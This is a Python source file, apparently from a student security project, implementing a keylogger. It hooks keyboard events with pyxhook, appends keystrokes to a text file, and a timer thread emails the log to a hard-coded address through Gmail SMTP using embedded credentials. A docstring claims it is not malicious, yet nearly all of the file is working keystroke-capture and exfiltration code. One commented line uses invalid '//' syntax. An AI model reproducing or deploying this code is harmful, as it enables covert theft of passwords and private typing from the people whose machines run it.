"""
Authors:
    Dominick Taylor (dxt9140@g.rit.edu)
    Bikash (bm7514@g.rit.edu)
    Isza

Created: 2/28/2018

A simple keylogger file that captures user key events using the pyxhook package.
Note, this is NOT intended as a malicious program. It is used to understand
security principles and demonstrate mastery of secure programming techniques.
"""

import pyxhook
import time
import threading
import smtplib

running = True
str = ""

#Email Logs
class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            with open("test.txt", 'r') as file:
                data = file.read()
            if len(data)>100:
                SERVER = "smtp.gmail.com" #Specify Server Here
                PORT = 587 #Specify Port Here
                USER="ritfakelogger@gmail.com"#Specify Username Here 
                PASS="fakekeylogg"#Specify Password Here
                FROM = USER#From address is taken from username
                # Change this email to receive email address 
                //TO = ["bm7514@g.rit.edu"] #Specify to address.Use comma if more than one to address is needed.
                SUBJECT = "Keylogger data:"
                MESSAGE = data
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, MESSAGE)
                    server.quit()
                    print("mail sent\n")
                    with open("test.txt", 'w') as file:
                        print("file reset\n")
                        file.write("")
                except Exception as e:
                    print(e)
            self.event.wait(1)

def keyDownEvent( event ):
    global running
    global str
    #if user press esc program terminates
    # will not be in final version
    if event.Ascii == 27:
        print("ESC")
        running = False
        return
    if event.Ascii == 8:
        str+="<BackSpace>"
    else:
        str+=chr(event.Ascii)
    if event.Ascii == 32 or event.Ascii == 13 or event.Ascii == 8 or event.Ascii == 9:
        # Spacebar indicates to end the program
        file = open("test.txt", 'a')
        file.write(str)
        file.close()
        str = ""

def main():
    global running
    running = True
    # create PyxHook object
    keyboard_hook = pyxhook.HookManager()
    # keyDownEvent function is called when keydown is detected
    keyboard_hook.KeyDown = keyDownEvent
    # hook the keyboad to listen
    keyboard_hook.HookKeyboard()
    # make it use thread 
    keyboard_hook.start()
    # create timeClass object
    mail=TimerClass()
    # start listening and sending mail
    mail.start()
    # keep running 
    while running:
        time.sleep(0.1)
    # close thread
    keyboard_hook.cancel()

if __name__ == '__main__':
    main()

#------------------------------------
# End of file

